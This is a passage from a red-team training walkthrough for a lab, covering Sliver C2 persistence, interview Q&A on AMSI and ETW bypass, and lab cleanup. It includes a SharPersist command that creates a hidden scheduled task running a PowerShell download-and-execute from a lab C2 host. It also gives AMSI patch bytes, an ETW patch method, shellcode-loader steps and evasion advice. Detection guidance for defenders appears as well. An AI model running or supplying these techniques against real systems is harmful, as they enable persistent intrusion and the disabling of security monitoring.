**Sliver has persistence commands:**

```bash
# Execute assemblies for persistence
sliver (HUNGRY_ZEBRA) > execute-assembly /opt/tools/SharPersist.exe -t schtask -n "UpdateTask" -c "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass -w hidden -c IEX(iwr http://192.168.100.100:8080/update.ps1)" -m add
```

## 18.8: Checking Your Persistence

**Enumerate scheduled tasks:**
```powershell
schtasks /query /fo LIST /v | findstr /i "Task\|Run"
```

**Enumerate registry run keys:**
```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Enumerate services (requires admin view all):**
```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
```

**Enumerate WMI subscriptions:**
```powershell
Get-WmiObject -Namespace root/subscription -Class __EventFilter
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

## 18.9: MITRE ATT&CK - Persistence Techniques

| Technique ID | Name | Our Implementation |
|-------------|------|-------------------|
| T1053.005 | Scheduled Task | schtasks + PowerShell download |
| T1547.001 | Registry Run Keys | HKCU Run key + encoded cmd |
| T1543.003 | Windows Service | sc.exe create with beacon binary |
| T1546.003 | WMI Event Subscription | __EventFilter persistence |

## 18.10: Interview Question - Persistence

**Q: "What persistence mechanisms would you implement after getting initial access?"**

**Answer:**

"My persistence strategy depends on the engagement scope and privileges:

**As a regular user (most common):**
1. **Scheduled Task**: Create a task that triggers at logon, using a name that blends in like 'WindowsHealthUpdate'. The task runs PowerShell to download a stager from my C2, bypassing AMSI in-memory.

2. **Registry Run Key**: Add an entry to `HKCU\...\Run` that uses `mshta` or `powershell` to fetch my payload at login. This survives reboots.

**With local admin:**
3. **Windows Service**: Create a service with automatic start that runs my payload as SYSTEM. This gives me the highest privileges and survives reboots.

4. **WMI Subscription**: Create an event subscription that triggers based on time or system events. Harder to detect than tasks/services.

**Evasion considerations:**
- Never write the actual payload to disk - always stage from C2
- Use AMSI bypass in all PowerShell payloads
- Use legitimate-looking names (not 'evil_backdoor')
- Consider the noise - services are logged, tasks are logged
- Have multiple persistence methods as backup"

---

# PART 18: Interview Questions {#part-18-interview}

These are questions you might be asked in red team or security engineer interviews.

## Question 1: What is AMSI and why is it important?

**Answer:**

AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 that allows applications to request antimalware scans of content before execution.

**Why it's important:**
- It catches fileless attacks that bypass traditional file-based scanning
- PowerShell, .NET, VBA, and other scripting engines use it
- It sees the final deobfuscated script content, so encoding doesn't help

**For attackers:** We must bypass AMSI to run known malicious scripts.
**For defenders:** AMSI is a critical chokepoint to monitor.

---

## Question 2: Explain how you would bypass AMSI.

**Answer:**

The most common technique is memory patching:

1. Load amsi.dll using LoadLibrary
2. Find AmsiScanBuffer using GetProcAddress
3. Change memory protection to writable using VirtualProtect
4. Overwrite the function start with bytes that return "clean" immediately
5. Now all AMSI scans return success without actually scanning

Patch bytes: `0xB8 0x57 0x00 0x07 0x80 0xC3`
- `mov eax, 0x80070057` (E_INVALIDARG error code)
- `ret` (return immediately)

---

## Question 3: What is ETW and why should attackers care about it?

**Answer:**

ETW (Event Tracing for Windows) is Windows' built-in logging system. It logs:
- Process creation
- Network connections
- PowerShell commands
- .NET assembly loading
- And hundreds of other events

**Why attackers care:** Even if AMSI is bypassed, ETW logs our activities. EDR products and SIEMs consume these logs. We can be detected even without real-time blocking.

**Solution:** Patch EtwEventWrite in ntdll.dll to return immediately.

---

## Question 4: What is the difference between a beacon and a session?

**Answer:**

**Beacon:**
- Checks in periodically (e.g., every 60 seconds)
- Low and slow traffic
- Harder to detect
- Commands execute on next check-in (delay)
- Better for long-term access

**Session:**
- Real-time interactive connection
- Continuous traffic
- Easier to detect by network monitoring
- Commands execute immediately
- Better for active exploitation

---

## Question 5: Why do we encrypt shellcode?

**Answer:**

**Static detection bypass:**
- Antivirus has signatures for known tools like Sliver, Cobalt Strike, Metasploit
- Raw shellcode matches these signatures
- Encrypted shellcode looks like random data
- No signature match = bypass static scanning

**We decrypt at runtime:** When the loader runs, it decrypts the shellcode in memory. By then, we've already bypassed AMSI, so the decrypted content isn't scanned.

---

## Question 6: Explain PAGE_EXECUTE_READWRITE and why it's suspicious.

**Answer:**

PAGE_EXECUTE_READWRITE (0x40) is a memory protection flag that allows:
- Reading the memory
- Writing to the memory
- Executing the memory as code

**Normal programs:**
- Code sections: PAGE_EXECUTE_READ (run but not modify)
- Data sections: PAGE_READWRITE (modify but not run)

**Why it's suspicious:**
- Legitimate software rarely needs RWX memory
- Shellcode loaders need to write code, then execute it
- Security products monitor VirtualAlloc calls with 0x40

**Alternative approach (more stealthy):**
1. Allocate with PAGE_READWRITE
2. Write shellcode
3. Change to PAGE_EXECUTE_READ with VirtualProtect
4. Execute

---

## Question 7: What is position-independent code?

**Answer:**

Position-independent code (PIC) is code that works correctly regardless of where in memory it's loaded.

**Normal programs:** Compiled to run at a specific base address. If loaded elsewhere, they need relocation fixes.

**Shellcode:** We don't know where it will be injected. It must work at address 0x10000, 0x50000, or anywhere else.

**How it's achieved:**
- Avoid absolute addresses
- Use relative addressing
- Resolve function addresses at runtime

---

## Question 8: Walk me through what happens when you run your loader.

**Answer:**

1. **Loader starts** as a normal .NET process
2. **AMSI patch:** Load amsi.dll, find AmsiScanBuffer, make writable, overwrite with return-immediately
3. **ETW patch:** Find EtwEventWrite in ntdll.dll, overwrite with ret
4. **Decrypt shellcode:** XOR each byte with key 0x35
5. **Allocate memory:** VirtualAlloc with PAGE_EXECUTE_READWRITE
6. **Copy shellcode:** Marshal.Copy to allocated memory
7. **Create thread:** CreateThread with lpStartAddress pointing to shellcode
8. **Shellcode executes:** Opens HTTPS connection to C2
9. **Beacon established:** Periodic check-in to receive commands
10. **Wait:** WaitForSingleObject keeps process alive

---

## Question 9: What is a C2 framework and name some popular ones.

**Answer:**

A C2 (Command and Control) framework is software that:
- Generates implants/payloads
- Listens for incoming connections
- Provides interface to send commands
- Manages multiple compromised systems

**Popular C2 frameworks:**
| Name | Type | Notes |
|------|------|-------|
| Cobalt Strike | Commercial ($3,500/year) | Most popular in real attacks |
| Sliver | Open source | Modern, actively developed |
| Metasploit | Open source | Widely detected, good for CTFs |
| Havoc | Open source | Modern, Cobalt Strike alternative |
| Mythic | Open source | Modular, multiple agents |
| Brute Ratel | Commercial | Designed for EDR evasion |

---

## Question 10: How would you detect this attack as a defender?

**Answer:**

**Detection opportunities:**

1. **ETW patching:** Monitor for VirtualProtect calls on ntdll.dll
2. **AMSI patching:** Hook AmsiScanBuffer, detect if it's modified
3. **RWX allocation:** Alert on VirtualAlloc with PAGE_EXECUTE_READWRITE
4. **Behavioral:** Process spawns, allocates RWX, creates thread
5. **Network:** HTTPS beaconing patterns (periodic, same interval)
6. **Module loading:** Unusual load of amsi.dll by non-standard processes
7. **Event gaps:** Sudden stop of ETW events from a process

---

## Question 11: What's the difference between User Mode and Kernel Mode?

**Answer:**

**User Mode (Ring 3):**
- Normal applications run here
- Cannot access hardware directly
- Cannot access other processes' memory
- Must use APIs to request services from OS

**Kernel Mode (Ring 0):**
- OS kernel and drivers run here
- Full access to hardware
- Can access any memory
- No restrictions

**Security implication:** Our malware runs in User Mode. We can only modify our own process (like patching AMSI in our process). We can't patch AMSI system-wide without Kernel access.

---

## Question 12: What is DLL injection and how does it relate to what we did?

**Answer:**

**DLL injection:** Forcing another process to load a malicious DLL.

**What we did:** Self-injection. We allocated memory in our own process, copied shellcode, and executed it. Not technically DLL injection.

**True DLL injection techniques:**
- CreateRemoteThread
- SetWindowsHookEx
- AppInit_DLLs
- Process hollowing

These inject into OTHER processes. More evasive (hide in legitimate process) but more complex and more detected.

---

## Question 13: Explain XOR encryption and its weaknesses.

**Answer:**

**XOR encryption:** Each byte is XORed with a key.
```
Plaintext:  0x48
Key:        0x35
Encrypted:  0x48 ^ 0x35 = 0x7D
Decrypt:    0x7D ^ 0x35 = 0x48
```

**Why we use it:**
- Simple to implement
- Fast
- Defeats static signature scanning

**Weaknesses:**
- Same key throughout = vulnerable to frequency analysis
- Known plaintext attack possible (if attacker knows some original bytes)
- Not cryptographically secure

**For our purposes:** Good enough. We just need to make the bytes look random, not defeat cryptanalysis.

---

## Question 14: What would you do differently for a real engagement?

**Answer:**

1. **Stronger encryption:** AES instead of XOR
2. **Anti-analysis:** Check for debuggers, VMs, sandboxes
3. **Staged loading:** Download shellcode from internet, don't embed
4. **Process injection:** Inject into legitimate process (explorer.exe)
5. **Sleep obfuscation:** Encrypt shellcode while sleeping
6. **Syscall evasion:** Direct syscalls instead of API calls
7. **Unique payloads:** New encryption key per target
8. **Domain fronting:** Use CDNs to hide C2 traffic
9. **Parent PID spoofing:** Pretend to be spawned by legitimate process
10. **ETW bypasses on specific providers:** Instead of blanket patch

---

## Question 15: What's the first thing you do after getting a beacon?

**Answer:**

1. **Situational awareness:**
   - `whoami` - Current user
   - `info` - System details
   - `ps` - Running processes (look for security tools)
   - `ifconfig` - Network interfaces

2. **Avoid detection:**
   - Don't immediately dump credentials
   - Understand the environment first
   - Note security products running

3. **Document everything:**
   - Screenshot the beacon
   - Note the timestamp
   - Record the access method

4. **Persist if authorized:**
   - Set up backup access
   - But only if scope allows

# PART 19: Cleanup and Next Steps {#part-19-cleanup}

## 19.1: Lab Cleanup

**On the target Windows machine:**

```powershell
# Delete the loader
Remove-Item C:\Temp\SliverLoader.exe -Force

# Check for persistence (there shouldn't be any from our simple beacon)
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
```

**In Sliver:**

```bash
# Kill the beacon
sliver > beacons

# Note the beacon ID
sliver > beacons rm <beacon-id>

# Stop the listener
sliver > jobs -k 1
```

**On Kali:**

```bash
# Remove generated files
rm /tmp/beacon.bin
rm /tmp/beacon_encrypted.bin
rm /tmp/beacon_encrypted.cs
rm -rf ~/ad-lab/loader
```

## 18.2: What's Next?

Now that you have initial access, the attack chain continues:

```
[DONE] Initial Access (This walkthrough)
   |
   v
[NEXT] Domain Enumeration with BloodHound
   See: 01_domain_enumeration_bloodhound.md
   |
   v
[CREDS] Credential Attacks
   - Kerberoasting (02_kerberoasting.md)
   - AS-REP Roasting (03_asrep_roasting.md)
   - Credential Dumping (04_credential_dumping.md)
   |
   v
[MOVE] Lateral Movement
   - Pass the Hash (07_pass_the_hash.md)
   - Pass the Ticket (07b_pass_the_ticket.md)
   |
   v
[WIN] Domain Dominance
   - DCSync (04b_dcsync_attack.md)
   - Golden Ticket (08_golden_ticket.md)
```

---

# WALKTHROUGH COMPLETE

**Congratulations!** You've completed the Initial Access walkthrough.

**What you learned:**

| Topic | Key Takeaway |
|-------|-------------|
| Computer Architecture | CPU executes instructions, RAM holds running code |
| Windows Defender | Multiple detection layers - static, runtime, behavioral |
| Windows APIs | How programs request services (VirtualAlloc, CreateThread, etc.) |
| Memory Protection | PAGE_EXECUTE_READWRITE allows code injection |
| AMSI | Script scanning - must patch to run known-bad scripts |
| ETW | Logging - must patch to avoid detection |
| Shellcode | Raw CPU instructions that do our bidding |
| C2 | Infrastructure for controlling compromised machines |
| Sliver | Open-source C2 framework |
| The Complete Attack | From zero to shell! |

**Total concepts covered:** 13 major parts with 18 sections

---

## MITRE ATT&CK Summary Matrix

```
+---------------------------------------------------------------------+
|                     INITIAL ACCESS ATTACK CHAIN                     |
+---------------------------------------------------------------------+
|                                                                     |
|  +--------------+    +--------------+    +--------------+           |
|  |  EXECUTION   |    |   DEFENSE    |    |    C2        |           |
|  |              |    |   EVASION    |    |              |           |
|  | * T1059.001  |    | * T1562.001  |    | * T1071.001  |           |
|  |   PowerShell |    |   AMSI/ETW   |    |   HTTPS      |           |
|  |              |    |              |    |              |           |
|  | * T1106      |    | * T1027      |    | * T1573.002  |           |
|  |   Native API |    |   Encryption |    |   TLS        |           |
|  +--------------+    |              |    +--------------+           |
|                      | * T1055      |                               |
|                      |   Shellcode  |                               |
|                      +--------------+                               |
|                                                                     |
+---------------------------------------------------------------------+
```

---

**Continue your journey:** [01_domain_enumeration_bloodhound.md](./01_domain_enumeration_bloodhound.md)

---

*Document created for ORSUBANK Red Team Training Lab*
*For authorized educational use only*

